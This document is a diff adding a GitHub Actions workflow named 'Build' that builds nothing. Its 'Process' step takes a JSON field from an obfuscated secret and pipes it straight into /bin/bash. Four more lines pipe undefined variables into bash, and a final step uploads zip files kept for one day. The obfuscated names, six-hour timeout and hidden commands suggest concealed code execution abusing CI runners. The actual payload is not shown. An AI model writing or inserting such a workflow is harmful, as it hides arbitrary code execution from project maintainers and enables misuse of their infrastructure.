@@ -1,0 +1,33 @@
+name: Build
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  automation:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Process
+        env:
+          o2700: ${{ secrets.o2700 }}
+        run: |
+          printf '%s' "$o2700" | jq -r .j1458 | /bin/bash
+          echo $t2546 | jq -r .hflbx77257 | /bin/bash
+          echo $t8 | jq -r .w0088 | /bin/bash
+          printf '%s' "$etu3150" | jq -r .xa395 | /bin/bash
+          echo $pc966 | jq -r .zitb100 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: QVyygWDZ
+          path: "*.zip"
+          retention-days: 1
